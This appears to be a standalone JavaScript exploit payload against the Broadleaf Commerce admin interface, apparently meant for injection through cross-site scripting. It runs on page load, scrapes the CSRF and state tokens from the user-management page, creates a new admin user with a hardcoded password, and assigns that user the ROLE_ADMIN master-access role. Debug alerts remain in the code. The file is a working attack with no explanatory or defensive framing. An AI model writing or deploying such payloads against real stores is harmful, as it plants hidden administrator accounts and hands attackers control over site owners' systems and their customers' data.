window.addEventListener("load", getTokenJS());

function getTokenJS() {
	alert('submit token');
    var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.open("GET", "/admin/user-management", true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            page = xhr.response
            csrf = page.getElementsByName("csrfToken");
            state = page.getElementsByName("stateVersionToken");
            console.log("The token is: " + csrf[0].value);
            console.log("The state is: " + state[0].value);
            submitFormWithTokenJS(csrf[0].value, state[0].value);
        }
    };
    xhr.send(null);
}

function submitFormWithTokenJS(token, state) {
	alert('submit add user');


    const username = "hn1as232232a3";

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/admin/user-management/add", true);

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.responseType = "document";

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
        		alert('redirect');
            console.log(xhr.responseURL)
            page = xhr.responseURL;
            var result = /[^/]*$/.exec(xhr.responseURL)[0];
            addAdminAccess(token,state,result);



        }
    }

    xhr.send("ceilingEntityClassname=org.broadleafcommerce.openadmin.server.security.domain.AdminUser&entityType=org.broadleafcommerce.openadmin.server.security.domain.AdminUserImpl&id=&sectionCrumbs=&mainEntityName=&preventSubmit=false&jsErrorMapString=&fields%5B'name'%5D.value="+username+"&fields%5B'login'%5D.value="+username+"&fields%5B'email'%5D.value="+username+"%40example.com&fields%5B'phoneNumber'%5D.value=&fields%5B'password'%5D.value="+username+"&fields%5B'passwordConfirm'%5D.value="+username+"&fields%5B'activeStatusFlag'%5D.value=true&fields%5B'auditable__createdBy'%5D.value=&fields%5B'auditable__dateCreated'%5D.value-display=&fields%5B'auditable__dateCreated'%5D.value=&fields%5B'auditable__updatedBy'%5D.value=&fields%5B'auditable__dateUpdated'%5D.value-display=&fields%5B'auditable__dateUpdated'%5D.value=&csrfToken="+token+"&stateVersionToken="+state);
}


function addAdminAccess(token,state,path) {
		alert('submit add user');

    var xhr = new XMLHttpRequest();
    xhr.open("POST", path+"/allRoles/add", true);

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    xhr.responseType = "document";

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
           

        }
    }

    xhr.send("fields%5B'id'%5D.value=-1&fields%5B'description'%5D.value=Admin+Master+Access&fields%5B'__adminMainEntity'%5D.value=ROLE_ADMIN&csrfToken="+token+"&stateVersionToken="+state);


}


